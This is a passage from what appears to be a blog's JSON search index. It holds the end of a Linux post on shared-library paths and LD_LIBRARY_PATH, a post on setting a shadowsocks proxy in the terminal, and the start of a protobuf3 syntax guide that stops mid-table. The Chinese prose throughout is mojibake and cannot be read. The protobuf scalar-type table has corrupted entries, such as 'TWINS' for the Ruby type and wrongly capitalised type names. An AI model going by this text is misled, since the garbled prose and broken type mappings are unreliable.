(0x00573000)\n........\n```\n\n\n\næˆ‘çš„ç³»ç»Ÿé‡Œæ²¡æœ‰è®¾ç½®`LD_LIBRARY_PATH`ç¯å¢ƒå˜é‡ï¼Œç°åœ¨æˆ‘ä»¬æŠŠå…¶ä¸­çš„ä¸€ä¸ªåº“`libmp3lame.so.0`ä»`/usr/loca/lib`ä¸‹ç§»åŠ¨åˆ°/optç›®å½•é‡Œï¼Œå¹¶æ‰§è¡Œldconfigï¼Œè®©`libmp3lame.so.0`å½»åº•ä»`/etc/ld.so.cache`é‡Œé¢æ¶ˆå¤±ã€‚å…¶å®`libmp3lame.so.0`åªæ˜¯`libmp3lame.so.0.0.0`çš„ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼Œæˆ‘ä»¬çœŸæ­£éœ€è¦ç§»åŠ¨çš„æ˜¯åè€….\n\nå®Œäº†ä¹‹åå†æ‰§è¡Œldd /usr/local/bin/ffmpegæ—¶ç»“æœå¦‚ä¸‹ï¼š\n\n```bash\n[root@localhost ~]# ldd /usr/local/bin/ffmpeg\n........\nlibmp3lame.so.0 => not found    //æœç„¶Not found äº†\nlibfaac.so.0 => /usr/local/lib/libfaac.so.0 (0x004a4000)\n........\n\n[root@localhost ~]# ffmpeg --help\nffmpeg: error while loading shared libraries: libmp3lame.so.0: cannot open shared object file: No such file or directory  //æ­¤æ—¶ffmpegå½“ç„¶è¿è¡Œä¸èµ·æ¥\n```\n\n   \n\n##### 2.2 LD_LIBRARY_PATH \n\næˆ‘ä»¬æ¥è¯•è¯•LD_LIBRARY_PATHï¼Œçœ‹çœ‹å¥½ä½¿ä¸ï¼š\n\n```bash\n[root@localhost opt]# export LD_LIBRARY_PATH=/opt:$LD_LIBRARY_PATH\n[root@localhost opt]# ldd /usr/local/bin/ffmpeg\n........\nlibmp3lame.so.0 => not found           //çº³å°¼ï¼Ÿï¼Ÿï¼ï¼ï¼\nlibfaac.so.0 => /usr/local/lib/libfaac.so.0 (0x00124000)\n........\n```\n\nè¿˜è®°å¾—ä¸Šé¢æåˆ°äº†è½¯é“¾æ¥ä¹ˆï¼Œ`libmp3lame.so.0`å°±æ˜¯`libmp3lame.so.0.0.0`çš„è½¯é“¾æ¥ï¼Œè¿™æ˜¯åŠ¨æ€åº“çš„å‘½åè§„èŒƒçš„ä¸€ç§å…¬çº¦ï¼Œæˆ‘ä»¬åªè¦åœ¨/opt/ç›®å½•ä¸‹å»ºç«‹ä¸€ä¸ªåä¸º`libmp3lame.so.0`çš„åˆ°`/opt/libmp3lame.so.0.0.0`çš„è½¯é“¾æ¥å°±OKäº†ï¼š\n\n```bash\n[root@localhost opt]# ln -s libmp3lame.so.0.0.0 libmp3lame.so.0\n[root@localhost opt]# ldd /usr/local/bin/ffmpeg\n........\nlibmp3lame.so.0 => /opt/libmp3lame.so.0 (0x00767000)   //ç»ˆäºåœ†æ»¡äº†:)\nlibfaac.so.0 => /usr/local/lib/libfaac.so.0 (0x006e8000)\n........\n```\n\n### 3. æ€»ç»“\n\né’ˆå¯¹åŠ¨æ€åº“è·¯å¾„æŸ¥æ‰¾çš„ç§ç§é—®é¢˜ï¼Œæ— éå°±è¿™ä¹ˆä¸¤å¤§ç±»ï¼Œå…³é”®æ˜¯æ‰¾å¯¹åŸå› ï¼Œå¯¹ç—‡ä¸‹è¯ï¼Œæ–¹èƒ½è¯åˆ°ç—…é™¤ã€‚\n\n+ PKG_CONFIG_PATHä»å­—é¢æ„æ€ä¸Šç¿»è¯‘ï¼Œå°±æ˜¯â€œè½¯ä»¶åŒ…çš„é…ç½®è·¯å¾„â€ï¼Œè¿™ä¸å¾ˆæ˜æ˜¾äº†ä¹ˆï¼Œç¼–è¯‘è½¯ä»¶æ—¶å¦‚æœå‡ºç°æ‰¾ä¸åˆ°æ‰€ä¾èµ–çš„åŠ¨æ€åº“æ—¶éƒ½å…¨é PKG_CONFIG_PATHäº†ï¼›\n+ LD_LIBRARY_PATHä¹Ÿå¾ˆç›´ç™½äº†â€œè£…è½½å™¨çš„åº“è·¯å¾„â€ï¼ŒLDæ˜¯Loaderçš„ç®€å†™ï¼Œåœ¨Linuxç³»ç»Ÿå¯åŠ¨ä¸€ä¸ªç¨‹åºçš„è¿‡ç¨‹å°±å«åšè£…è½½ï¼Œä¸€ä¸ªç¨‹åºè¦æ‰§è¡Œæ—¶å®ƒæˆ–å¤šæˆ–å°‘çš„ä¼šä¾èµ–ä¸€äº›åŠ¨æ€åº“(é™æ€ç¼–è¯‘çš„é™¤å¤–)ã€‚\n\n### 4. å‚è€ƒèµ„æ–™\n\n+ http://blog.chinaunix.net/uid-23069658-id-4028681.html\n+ https://prefetch.net/articles/linkers.badldlibrary.html","tags":["linux"],"categories":["ç³»ç»Ÿ"]},{"title":"ä¸ºiterm2è®¾ç½®shadowsocksä»£ç†","url":"%2Fp%2F937317d6.html","content":"\nshadowsocksæ˜¯æˆ‘ä»¬å¸¸ç”¨çš„ä»£ç†å·¥å…·ï¼Œå®ƒä½¿ç”¨socks5åè®®ï¼Œè€Œç»ˆç«¯å¾ˆå¤šå·¥å…·ç›®å‰åªæ”¯æŒhttpå’Œhttpsç­‰åè®®ï¼Œå¯¹socks5åè®®æ”¯æŒä¸å¤Ÿå¥½ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸ºç»ˆç«¯è®¾ç½®shadowsocksçš„æ€è·¯å°±æ˜¯å°†socksåè®®è½¬æ¢æˆhttpåè®®ï¼Œç„¶åä¸ºç»ˆç«¯è®¾ç½®å³å¯ã€‚\n\n\n\n# 1. è®¾ç½®ç»ˆç«¯ä»£ç†\n\næœ€æ–°çš„ [ShadowsocksX-NG](https://github.com/shadowsocks/ShadowsocksX-NG/releases/) å·²ç»æ”¯æŒç»ˆç«¯ä»£ç†, æˆ‘ä»¬å¯ä»¥å¦‚ä¸‹å›¾å¤åˆ¶å¾—å‡º:\n```bash\nexport http_proxy=http://127.0.0.1:1087;export https_proxy=http://127.0.0.1:1087;\n```\n<!-- more -->\n\n![1](ä¸ºiterm2è®¾ç½®shadowsocksä»£ç†/1.png)\n\n\n\nä¸ºäº†æ–¹ä¾¿, æˆ‘ä»¬å¯ä»¥åˆ¶ä½œä¸€ä¸‹åˆ«å\n\n```bash\nalias setproxy='export http_proxy=http://127.0.0.1:1087;export https_proxy=http://127.0.0.1:1087;' # è®¾ç½®ç»ˆç«¯ä»£ç†\n\nalias disproxy='unset http_proxy https_proxy' # å–æ¶ˆç»ˆç«¯ä»£ç†\n\nalias ip='curl cip.cc' # æµ‹è¯•\n```\n\nå¦å¤–æˆ‘ä»¬å¯ä»¥é€šè¿‡`ShadowsocksX-NG` çš„åå¥½è®¾ç½®çœ‹åˆ°ä»¥ä¸‹ç›¸å…³é…ç½®.\n\n\n\n### 1.1 httpç›‘å¬ç«¯å£\n\n![1](ä¸ºiterm2è®¾ç½®shadowsocksä»£ç†/2.png)\n\n\n\n### 1.2 sockes5ç›‘å¬ç«¯å£\n\n![1](ä¸ºiterm2è®¾ç½®shadowsocksä»£ç†/3.png)\n\n\n\n# 2. å‚è€ƒèµ„æ–™\n\n+ https://droidyue.com/blog/2016/04/04/set-shadowsocks-proxy-for-terminal/\n+ https://blog.naaln.com/2019/03/terminal-proxy/\n","tags":["linux"],"categories":["zsh"]},{"title":"protobuf3è¯­æ³•æŒ‡å—","url":"%2Fp%2F21122343.html","content":"\n\nProtocol Bufferæ˜¯Googleçš„è¯­è¨€ä¸­ç«‹çš„ï¼Œå¹³å°ä¸­ç«‹çš„ï¼Œå¯æ‰©å±•æœºåˆ¶çš„ï¼Œç”¨äºåºåˆ—åŒ–ç»“æ„åŒ–æ•°æ® - å¯¹æ¯”XMLï¼Œä½†æ›´å°ï¼Œæ›´å¿«ï¼Œæ›´ç®€å•ã€‚æ‚¨å¯ä»¥å®šä¹‰æ•°æ®çš„ç»“æ„åŒ–ï¼Œç„¶åå¯ä»¥ä½¿ç”¨ç‰¹æ®Šç”Ÿæˆçš„æºä»£ç è½»æ¾åœ°åœ¨å„ç§æ•°æ®æµä¸­ä½¿ç”¨å„ç§è¯­è¨€ç¼–å†™å’Œè¯»å–ç»“æ„åŒ–æ•°æ®ã€‚\n\n### 1. å®šä¹‰æ¶ˆæ¯ç±»å‹\n\nå…ˆæ¥çœ‹ä¸€ä¸ªéå¸¸ç®€å•çš„ä¾‹å­ã€‚å‡è®¾ä½ æƒ³å®šä¹‰ä¸€ä¸ªâ€œæœç´¢è¯·æ±‚â€çš„æ¶ˆæ¯æ ¼å¼ï¼Œæ¯ä¸€ä¸ªè¯·æ±‚å«æœ‰ä¸€ä¸ªæŸ¥è¯¢å­—ç¬¦ä¸²ã€ä½ æ„Ÿå…´è¶£çš„æŸ¥è¯¢ç»“æœæ‰€åœ¨çš„é¡µæ•°ï¼Œä»¥åŠæ¯ä¸€é¡µå¤šå°‘æ¡æŸ¥è¯¢ç»“æœã€‚å¯ä»¥é‡‡ç”¨å¦‚ä¸‹çš„æ–¹å¼æ¥å®šä¹‰æ¶ˆæ¯ç±»å‹çš„.protoæ–‡ä»¶äº†ï¼š\n\n```protobuf\nsyntax = \"proto3\";\n\nmessage SearchRequest {\n  string query = 1;\n  int32 page_number = 2;\n  int32 result_per_page = 3;\n}\n```\n\n- è¯¥æ–‡ä»¶çš„ç¬¬ä¸€è¡ŒæŒ‡å®šæ‚¨æ­£åœ¨ä½¿ç”¨`proto3`è¯­æ³•ï¼šå¦‚æœæ‚¨ä¸è¿™æ ·åšï¼Œprotobuf ç¼–è¯‘å™¨å°†å‡å®šæ‚¨æ­£åœ¨ä½¿ç”¨[proto2](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto)ã€‚è¿™å¿…é¡»æ˜¯æ–‡ä»¶çš„ç¬¬ä¸€ä¸ªéç©ºçš„éæ³¨é‡Šè¡Œã€‚\n- æ‰€è¿°`SearchRequest`æ¶ˆæ¯å®šä¹‰æŒ‡å®šäº†ä¸‰ä¸ªå­—æ®µï¼ˆåç§°/å€¼å¯¹ï¼‰ï¼Œä¸€ä¸ªç”¨äºè¦åœ¨æ­¤ç±»å‹çš„æ¶ˆæ¯ä¸­åŒ…å«çš„æ¯ä¸ªæ•°æ®ç‰‡æ®µã€‚æ¯ä¸ªå­—æ®µéƒ½æœ‰ä¸€ä¸ªåç§°å’Œç±»å‹ã€‚\n\n<!-- more -->\n\n##### 1.1 æŒ‡å®šå­—æ®µç±»å‹\n\nåœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæ‰€æœ‰å­—æ®µéƒ½æ˜¯[æ ‡é‡ç±»å‹](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23scalar)ï¼šä¸¤ä¸ªæ•´æ•°ï¼ˆ`page_number`å’Œ`result_per_page`ï¼‰å’Œä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆ`query`ï¼‰ã€‚ä½†æ˜¯ï¼Œæ‚¨è¿˜å¯ä»¥ä¸ºå­—æ®µæŒ‡å®šåˆæˆç±»å‹ï¼ŒåŒ…æ‹¬[æšä¸¾](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23enum)å’Œå…¶ä»–æ¶ˆæ¯ç±»å‹ã€‚\n\n\n\n##### 1.2 åˆ†é…æ ‡è¯†å·\n\næ­£å¦‚ä¸Šè¿°æ–‡ä»¶æ ¼å¼ï¼Œåœ¨æ¶ˆæ¯å®šä¹‰ä¸­ï¼Œæ¯ä¸ªå­—æ®µéƒ½æœ‰å”¯ä¸€çš„ä¸€ä¸ª**æ•°å­—æ ‡è¯†ç¬¦**ã€‚è¿™äº›æ ‡è¯†ç¬¦æ˜¯ç”¨æ¥åœ¨æ¶ˆæ¯çš„[äºŒè¿›åˆ¶æ ¼å¼](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fencoding)ä¸­è¯†åˆ«å„ä¸ªå­—æ®µçš„ï¼Œä¸€æ—¦å¼€å§‹ä½¿ç”¨å°±ä¸èƒ½å¤Ÿå†æ”¹å˜ã€‚æ³¨ï¼š[1,15]ä¹‹å†…çš„æ ‡è¯†å·åœ¨ç¼–ç çš„æ—¶å€™ä¼šå ç”¨ä¸€ä¸ªå­—èŠ‚ã€‚[16,2047]ä¹‹å†…çš„æ ‡è¯†å·åˆ™å ç”¨2ä¸ªå­—èŠ‚ã€‚æ‰€ä»¥åº”è¯¥ä¸ºé‚£äº›é¢‘ç¹å‡ºç°çš„æ¶ˆæ¯å…ƒç´ ä¿ç•™ [1,15]ä¹‹å†…çš„æ ‡è¯†å·ã€‚åˆ‡è®°ï¼šè¦ä¸ºå°†æ¥æœ‰å¯èƒ½æ·»åŠ çš„ã€é¢‘ç¹å‡ºç°çš„æ ‡è¯†å·é¢„ç•™ä¸€äº›æ ‡è¯†å·ã€‚\n\næœ€å°çš„æ ‡è¯†å·å¯ä»¥ä»1å¼€å§‹ï¼Œæœ€å¤§åˆ°2^29 - 1, or 536,870,911ã€‚ä¸å¯ä»¥ä½¿ç”¨å…¶ä¸­çš„[19000ï¼19999]çš„æ ‡è¯†å·ï¼Œ Protobufåè®®å®ç°ä¸­å¯¹è¿™äº›è¿›è¡Œäº†é¢„ç•™ã€‚å¦‚æœéè¦åœ¨.protoæ–‡ä»¶ä¸­ä½¿ç”¨è¿™äº›é¢„ç•™æ ‡è¯†å·ï¼Œç¼–è¯‘æ—¶å°±ä¼šæŠ¥è­¦ã€‚\n\n\n\n##### 1.3 æŒ‡å®šå­—æ®µè§„åˆ™\n\næ¶ˆæ¯å­—æ®µå¯ä»¥æ˜¯ä»¥ä¸‹ä¹‹ä¸€ï¼š\n\n- å•æ•°ï¼šæ ¼å¼è‰¯å¥½çš„æ¶ˆæ¯å¯ä»¥åŒ…å«è¯¥å­—æ®µä¸­çš„é›¶ä¸ªæˆ–ä¸€ä¸ªï¼ˆä½†ä¸è¶…è¿‡ä¸€ä¸ªï¼‰ã€‚\n- `repeated`ï¼šæ­¤å­—æ®µå¯ä»¥åœ¨æ ¼å¼è‰¯å¥½çš„æ¶ˆæ¯ä¸­é‡å¤ä»»æ„æ¬¡æ•°ï¼ˆåŒ…æ‹¬é›¶ï¼‰ã€‚å°†ä¿ç•™é‡å¤å€¼çš„é¡ºåºã€‚åœ¨proto3ä¸­ï¼Œ`repeated`æ•°å­—ç±»å‹çš„å­—æ®µé»˜è®¤ä½¿ç”¨`packed`ç¼–ç ã€‚`packed`æ‚¨å¯ä»¥åœ¨[åè®®ç¼“å†²åŒºç¼–ç ä¸­](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fencoding.html%23packed)æ‰¾åˆ°æœ‰å…³ç¼–ç çš„æ›´å¤šä¿¡æ¯ã€‚\n\n+ é™å®šä¿®é¥°ç¬¦åŒ…å« required\\optional\\repeated\n\n  + Required: è¡¨ç¤ºæ˜¯ä¸€ä¸ªå¿…é¡»å­—æ®µï¼Œå¿…é¡»ç›¸å¯¹äºå‘é€æ–¹ï¼Œåœ¨å‘é€æ¶ˆæ¯ä¹‹å‰å¿…é¡»è®¾ç½®è¯¥å­—æ®µçš„å€¼ï¼Œå¯¹äºæ¥æ”¶æ–¹ï¼Œå¿…é¡»èƒ½å¤Ÿè¯†åˆ«è¯¥å­—æ®µçš„æ„æ€ã€‚å‘é€ä¹‹å‰æ²¡æœ‰è®¾ç½®requiredå­—æ®µæˆ–è€…æ— æ³•è¯†åˆ«requiredå­—æ®µéƒ½ä¼šå¼•å‘ç¼–è§£ç å¼‚å¸¸ï¼Œå¯¼è‡´æ¶ˆæ¯è¢«ä¸¢å¼ƒã€‚\n\n  + Optionalï¼šè¡¨ç¤ºæ˜¯ä¸€ä¸ªå¯é€‰å­—æ®µï¼Œå¯é€‰å¯¹äºå‘é€æ–¹ï¼Œåœ¨å‘é€æ¶ˆæ¯æ—¶ï¼Œå¯ä»¥æœ‰é€‰æ‹©æ€§çš„è®¾ç½®æˆ–è€…ä¸è®¾ç½®è¯¥å­—æ®µçš„å€¼ã€‚å¯¹äºæ¥æ”¶æ–¹ï¼Œå¦‚æœèƒ½å¤Ÿè¯†åˆ«å¯é€‰å­—æ®µå°±è¿›è¡Œç›¸åº”çš„å¤„ç†ï¼Œå¦‚æœæ— æ³•è¯†åˆ«ï¼Œåˆ™å¿½ç•¥è¯¥å­—æ®µï¼Œæ¶ˆæ¯ä¸­çš„å…¶å®ƒå­—æ®µæ­£å¸¸å¤„ç†ã€‚---å› ä¸ºoptionalå­—æ®µçš„ç‰¹æ€§ï¼Œå¾ˆå¤šæ¥å£åœ¨å‡çº§ç‰ˆæœ¬ä¸­éƒ½æŠŠåæ¥æ·»åŠ çš„å­—æ®µéƒ½ç»Ÿä¸€çš„è®¾ç½®ä¸ºoptionalå­—æ®µï¼Œè¿™æ ·è€çš„ç‰ˆæœ¬æ— éœ€å‡çº§ç¨‹åºä¹Ÿå¯ä»¥æ­£å¸¸çš„ä¸æ–°çš„è½¯ä»¶è¿›è¡Œé€šä¿¡ï¼Œåªä¸è¿‡æ–°çš„å­—æ®µæ— æ³•è¯†åˆ«è€Œå·²ï¼Œå› ä¸ºå¹¶ä¸æ˜¯æ¯ä¸ªèŠ‚ç‚¹éƒ½éœ€è¦æ–°çš„åŠŸèƒ½ï¼Œå› æ­¤å¯ä»¥åšåˆ°æŒ‰éœ€å‡çº§å’Œå¹³æ»‘è¿‡æ¸¡ã€‚\n\n  + Repeatedï¼šè¡¨ç¤ºè¯¥å­—æ®µå¯ä»¥åŒ…å«0~Nä¸ªå…ƒç´ ã€‚å…¶ç‰¹æ€§å’Œoptionalä¸€æ ·ï¼Œä½†æ˜¯æ¯ä¸€æ¬¡å¯ä»¥åŒ…å«å¤šä¸ªå€¼ã€‚å¯ä»¥çœ‹ä½œæ˜¯åœ¨ä¼ é€’ä¸€ä¸ªæ•°ç»„çš„å€¼ã€‚\n\n\n\n##### 1.4 æ·»åŠ æ›´å¤šæ¶ˆæ¯ç±»å‹\n\nå¯ä»¥åœ¨å•ä¸ª`.proto`æ–‡ä»¶ä¸­å®šä¹‰å¤šç§æ¶ˆæ¯ç±»å‹ã€‚å¦‚æœè¦å®šä¹‰å¤šä¸ªç›¸å…³æ¶ˆæ¯ï¼Œè¿™å¾ˆæœ‰ç”¨  \n\nä¾‹å¦‚ï¼Œå¦‚æœè¦å®šä¹‰ä¸`SearchResponse`æ¶ˆæ¯ç±»å‹å¯¹åº”çš„å›å¤æ¶ˆæ¯æ ¼å¼ï¼Œå¯ä»¥å°†å…¶æ·»åŠ åˆ°ç›¸åŒçš„æ¶ˆæ¯`.proto`ï¼š\n\n```protobuf\nmessage SearchRequest {\n  string query = 1;\n  int32 page_number = 2;\n  int32 result_per_page = 3;\n}\n\nmessage SearchResponse {\n ...\n}\n```\n\n\n\n##### 1.5 æ·»åŠ æ³¨é‡Š\n\nè¦ä¸º`.proto`æ–‡ä»¶æ·»åŠ æ³¨é‡Šï¼Œè¯·ä½¿ç”¨C / C ++ - æ ·å¼`//`å’Œ`/* ... */`è¯­æ³•ã€‚\n\n```protobuf\n/* SearchRequestè¡¨ç¤ºæœç´¢æŸ¥è¯¢ï¼Œå¸¦æœ‰åˆ†é¡µé€‰é¡¹\n *è¡¨æ˜å“åº”ä¸­åŒ…å«å“ªäº›ç»“æœã€‚*/\n\nmessage SearchRequest {\n  string query = 1;\n  int32 page_number = 2; //æˆ‘ä»¬æƒ³è¦å“ªä¸ªé¡µç ï¼Ÿ\n  int32 result_per_page = 3; //æ¯é¡µè¿”å›çš„ç»“æœæ•°ã€‚\n}\n```\n\n\n\n##### 1.6 ä¿ç•™å­—æ®µ\n\nå¦‚æœé€šè¿‡å®Œå…¨åˆ é™¤å­—æ®µæˆ–å°†å…¶æ³¨é‡Šæ¥[æ›´æ–°](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23updating)æ¶ˆæ¯ç±»å‹ï¼Œåˆ™æœªæ¥ç”¨æˆ·å¯ä»¥åœ¨å¯¹ç±»å‹è¿›è¡Œè‡ªå·±çš„æ›´æ–°æ—¶é‡ç”¨å­—æ®µç¼–å·ã€‚\n\nå¦‚æœä»¥ååŠ è½½ç›¸åŒçš„æ—§ç‰ˆæœ¬ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´ä¸¥é‡é—®é¢˜`.proto`ï¼ŒåŒ…æ‹¬æ•°æ®æŸåï¼Œéšç§é”™è¯¯ç­‰ã€‚ç¡®ä¿ä¸ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µçš„ä¸€ç§æ–¹æ³•æ˜¯æŒ‡å®šå·²åˆ é™¤å­—æ®µçš„å­—æ®µç¼–å·ï¼ˆå’Œ/æˆ–åç§°ï¼Œè¿™ä¹Ÿå¯èƒ½å¯¼è‡´JSONåºåˆ—åŒ–é—®é¢˜ï¼‰`reserved`ã€‚å¦‚æœå°†æ¥çš„ä»»ä½•ç”¨æˆ·å°è¯•ä½¿ç”¨è¿™äº›å­—æ®µæ ‡è¯†ç¬¦ï¼Œåè®®ç¼“å†²ç¼–è¯‘å™¨å°†ä¼šæŠ±æ€¨ã€‚\n\n```protobuf\nmessage Foo {\n  reserved 2, 15, 9 to 11;\n  reserved \"foo\", \"bar\";\n}\n```\n\nè¯·æ³¨æ„ï¼Œæ‚¨ä¸èƒ½åœ¨åŒä¸€`reserved`è¯­å¥ä¸­æ··åˆå­—æ®µåç§°å’Œå­—æ®µç¼–å·ã€‚\n\n\n\n##### 1.7 ä½ çš„ç”Ÿæˆæ˜¯ä»€ä¹ˆ`.proto`ï¼Ÿ\n\nå½“æ‚¨åœ¨aä¸Šè¿è¡Œ[åè®®ç¼“å†²åŒºç¼–è¯‘å™¨](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23generating)æ—¶`.proto`ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆæ‚¨æ‰€é€‰è¯­è¨€çš„ä»£ç ï¼Œæ‚¨éœ€è¦ä½¿ç”¨æ‚¨åœ¨æ–‡ä»¶ä¸­æè¿°çš„æ¶ˆæ¯ç±»å‹ï¼ŒåŒ…æ‹¬è·å–å’Œè®¾ç½®å­—æ®µå€¼ï¼Œå°†æ¶ˆæ¯åºåˆ—åŒ–ä¸ºè¾“å‡ºæµï¼Œå¹¶ä»è¾“å…¥æµè§£ææ‚¨çš„æ¶ˆæ¯ã€‚\n\n- å¯¹äº**C ++**ï¼Œç¼–è¯‘å™¨ä¼šä»æ¯ä¸ªæ–‡ä»¶ç”Ÿæˆä¸€ä¸ª`.h`å’Œä¸€ä¸ª`.cc`æ–‡ä»¶`.proto`ï¼Œå¹¶ä¸ºæ‚¨æ–‡ä»¶ä¸­æè¿°çš„æ¯ç§æ¶ˆæ¯ç±»å‹æä¾›ä¸€ä¸ªç±»ã€‚\n- å¯¹äº**Java**ï¼Œç¼–è¯‘å™¨ç”Ÿæˆä¸€ä¸ª`.java`æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¯ç§æ¶ˆæ¯ç±»å‹çš„ç±»ï¼Œä»¥åŠ`Builder`ç”¨äºåˆ›å»ºæ¶ˆæ¯ç±»å®ä¾‹çš„ç‰¹æ®Šç±»ã€‚\n- **Python**æœ‰ç‚¹ä¸åŒ - Pythonç¼–è¯‘å™¨ç”Ÿæˆä¸€ä¸ªæ¨¡å—ï¼Œå…¶ä¸­åŒ…å«æ¯ä¸ªæ¶ˆæ¯ç±»å‹çš„é™æ€æè¿°ç¬¦ï¼Œ`.proto`ç„¶åä¸*å…ƒç±»*ä¸€èµ·ä½¿ç”¨ï¼Œä»¥åœ¨è¿è¡Œæ—¶åˆ›å»ºå¿…è¦çš„Pythonæ•°æ®è®¿é—®ç±»ã€‚\n- å¯¹äº**Go**ï¼Œç¼–è¯‘å™¨ä¼šä¸º`.pb.go`æ–‡ä»¶ä¸­çš„æ¯ç§æ¶ˆæ¯ç±»å‹ç”Ÿæˆä¸€ä¸ªç±»å‹çš„æ–‡ä»¶ã€‚\n- å¯¹äº**Ruby**ï¼Œç¼–è¯‘å™¨ç”Ÿæˆä¸€ä¸ª`.rb`åŒ…å«æ¶ˆæ¯ç±»å‹çš„Rubyæ¨¡å—çš„æ–‡ä»¶ã€‚\n- å¯¹äº**Objective-C**ï¼Œç¼–è¯‘å™¨ä»æ¯ä¸ªæ–‡ä»¶ç”Ÿæˆä¸€ä¸ª`pbobjc.h`å’Œä¸€ä¸ª`pbobjc.m`æ–‡ä»¶`.proto`ï¼Œå…¶ä¸­åŒ…å«æ–‡ä»¶ä¸­æè¿°çš„æ¯ç§æ¶ˆæ¯ç±»å‹çš„ç±»ã€‚\n- å¯¹äº**Cï¼ƒ**ï¼Œç¼–è¯‘å™¨ä¼š`.cs`ä»æ¯ä¸ªæ–‡ä»¶ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶`.proto`ï¼Œå…¶ä¸­åŒ…å«æ–‡ä»¶ä¸­æè¿°çš„æ¯ç§æ¶ˆæ¯ç±»å‹çš„ç±»ã€‚\n\næ‚¨å¯ä»¥æŒ‰ç…§æ‰€é€‰è¯­è¨€çš„æ•™ç¨‹ï¼ˆå³å°†æ¨å‡ºçš„proto3ç‰ˆæœ¬ï¼‰äº†è§£æœ‰å…³ä¸ºæ¯ç§è¯­è¨€ä½¿ç”¨APIçš„æ›´å¤šä¿¡æ¯ã€‚æœ‰å…³æ›´å¤šAPIè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…ç›¸å…³[APIå‚è€ƒ](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)ï¼ˆproto3ç‰ˆæœ¬å³å°†æ¨å‡ºï¼‰ã€‚\n\n\n\n### 2. æ ‡é‡å€¼ç±»å‹\n\næ ‡é‡æ¶ˆæ¯å­—æ®µå¯ä»¥å…·æœ‰ä»¥ä¸‹ç±»å‹ä¹‹ä¸€ - è¯¥è¡¨æ˜¾ç¤º`.proto`æ–‡ä»¶ä¸­æŒ‡å®šçš„ç±»å‹ï¼Œä»¥åŠè‡ªåŠ¨ç”Ÿæˆçš„ç±»ä¸­çš„ç›¸åº”ç±»å‹ï¼š\n\n| .proto type | notes                                                        | C ++ type | Java type   | Python type [2]  |  Go type         | Ruby type                    | C# type     | PHP type          |\n| ----------- | :----------------------------------------------------------- | --------- | ----------- | ---------------- | ------- | ---------------------------- | ----------- | ----------------- |\n| double      |                                                              | double    | double      | float            | float64 | float                        | double      | float             |\n| float       |                                                              | float     | float       | float            | FLOAT32 | float                        | float       | float             |\n| INT32       | ä½¿ç”¨å¯å˜é•¿åº¦ç¼–ç ã€‚ç¼–ç è´Ÿæ•°çš„æ•ˆç‡ä½ - å¦‚æœæ‚¨çš„å­—æ®µå¯èƒ½æœ‰è´Ÿå€¼ï¼Œè¯·æ”¹ç”¨sint32ã€‚ | INT32     | INT         | INT              | INT32   | Fixnum or Bignum (as needed) | INT         | Integer           |\n| Int64       | ä½¿ç”¨å¯å˜é•¿åº¦ç¼–ç ã€‚ç¼–ç è´Ÿæ•°çš„æ•ˆç‡ä½ - å¦‚æœæ‚¨çš„å­—æ®µå¯èƒ½æœ‰è´Ÿå€¼ï¼Œè¯·æ”¹ç”¨sint64ã€‚ | Int64     | long        | int / long [3]   | Int64   | TWINS                        | long        | Integer/string[5] |\n| UINT32      | ä½¿ç”¨å¯å˜é•¿åº¦ç¼–ç ã€‚                                           | UINT32    | int [1]     | int / long [3]   | UINT32  | Fixnum or Bignum (as needed) | UINT        | Integer           |\n| UINT64      | ä½¿ç”¨å¯å˜é•¿åº¦ç¼–ç ã€‚                                           | UINT64    | Long [1]    | int / long [3]   | UINT64  | TWINS                        | ULONG       | Integer/string[5] |\n| SINT32      | ä½¿ç”¨å¯å˜é•¿åº¦ç¼–ç ã€‚ç­¾åçš„intå€¼ã€‚è¿™äº›æ¯”å¸¸è§„int32æ›´æœ‰æ•ˆåœ°ç¼–ç è´Ÿæ•°ã€‚ | INT32     | INT         | INT              | INT32   | Fixnum or Bignum (as needed) | INT         | Integer           |\n| sint64      | ä½¿ç”¨å¯å˜é•¿åº¦ç¼–ç ã€‚ç­¾åçš„intå€¼ã€‚è¿™äº›æ¯”å¸¸è§„int64æ›´æœ‰æ•ˆåœ°ç¼–ç è´Ÿæ•°ã€‚ | Int64     | long        | int / long [3]   | Int64   | TWINS                        | long        | Integer/string[5] |\n| fixed32     | æ€»æ˜¯å››ä¸ªå­—èŠ‚ã€‚å¦‚æœå€¼é€šå¸¸å¤§äº2 28ï¼Œåˆ™æ¯”uint32æ›´æœ‰æ•ˆã€‚         | UINT32    | int [1]     | int / long [3]   | UINT32  | Fixnum or Bignum (as needed) | UINT        | Integer           |\n| fixed64     | æ€»æ˜¯å…«ä¸ªå­—èŠ‚ã€‚å¦‚æœå€¼é€šå¸¸å¤§äº2 56ï¼Œåˆ™æ¯”uint64æ›´æœ‰æ•ˆã€‚         | UINT64    | Long [1]    | int / long [3]   | UINT64  | TWINS                        | ULONG       | Integer/string[5] |\n| sfixed32    | æ€»æ˜¯å››ä¸ªå­—èŠ‚ã€‚                                               | INT32     | INT         | INT              | INT32   | Fixnum or Bignum (as needed) | INT         | Integer           |\n| sfixed64    | æ€»æ˜¯å…«ä¸ªå­—èŠ‚ã€‚                                               | Int64     | long        | int / long [3]   | Int64   | TWINS                        | long        | Integer/string[5] |\n| 